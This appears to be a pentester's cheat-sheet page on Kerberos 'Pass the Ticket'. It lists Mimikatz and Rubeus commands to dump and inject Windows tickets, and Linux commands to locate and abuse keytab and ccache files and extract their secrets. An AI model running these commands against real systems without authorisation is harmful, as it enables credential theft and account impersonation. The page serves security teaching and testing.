# Pass the Ticket

A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called Pass the ticket

### Windows

#### Harvest tickets

{% tabs %}
{% tab title="Mimikatz" %}
```sh
# Will output .kirbi files, which contain the tickets
sekurlsa::tickets /export
```
{% endtab %}

{% tab title="Rubeus" %}
```sh
# Export the ticket to b64 format
Rubeus.exe dump /nowrap
```
{% endtab %}
{% endtabs %}

#### Pass the ticket

{% tabs %}
{% tab title="Mimikatz" %}
```javascript
kerberos::ptt "<.kirbi>"
```
{% endtab %}

{% tab title="Rubeus" %}
```sh
Rubeus.exe ptt /ticket:<.kirbi>
Rubeus.exe ptt /ticket:<B64_TICKET> # If we exported the ticket as b64
```
{% endtab %}
{% endtabs %}

#### Powershell remoting

{% tabs %}
{% tab title="Mimikatz" %}
```sh
# Pass the ticket to our session with mimikatz and connect to another computer
kerberos::ptt "<KIRBI_FILE>"
Enter-PSSession -ComputerName <COMPUTER_NAME>
```
{% endtab %}

{% tab title="Rubeus" %}
```sh
# Create a sacrificial process with Rubeus => will open a new cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# Use the new cmd to request a ticket and pass it
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /ptt
Enter-PSSession -ComputerName <COMPUTER_NAME
```
{% endtab %}
{% endtabs %}

### Linux

A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. <mark style="background-color:$danger;">The ticket is represented as a</mark> <mark style="background-color:$danger;">`keytab`</mark> <mark style="background-color:$danger;">file located by default at</mark> <mark style="background-color:$danger;">`/etc/krb5.keytab`</mark> <mark style="background-color:$danger;">and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account</mark>

A `keytab` is a file containing pairs of Kerberos principals and encrypted keys. `Keytab` files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file

In most cases, Linux machines store Kerberos tickets as `ccache` files in the `/tmp` directory

A credential cache or `ccache` file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a `ccache` file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable

#### Find if the machine is domain-joined

```sh
realm list
ps -ef | grep -i "winbind\|sssd"
```

#### Find keytab files

```sh
# To use a keytab file, we must have rw privileges on the file
find / -name *keytab* -ls 2>/dev/null
crontab -l
```

#### Find ccache files

```sh
# The path to the file is placed in the KRB5CCNAME env var
env | grep -i krb5

# The default location on ccache files is /tmp
ls -la /tmp
```

#### Abuse keytab files

```sh
# List ticket info
klist -k -t <KEYTAB_FILE>

# Impersonate a user with a keytab file
kinit <PRINCIPLE_NAME> -k -t <KEYTAB_FILE>

# Extract the secrets from a keytab file
https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <.KEYTAB_FILE>
```

#### Abuse ccache files

```sh
export KRB5CCNAME=<ccache>
```

### Convert kirbi to ccache

```sh
# Convert ccache to kirbi
impacket-ticketConverter <ccache> <kirbi>

# Convert kirbi to ccache 
impacket-ticketConverter <kirbi> <ccache>
```
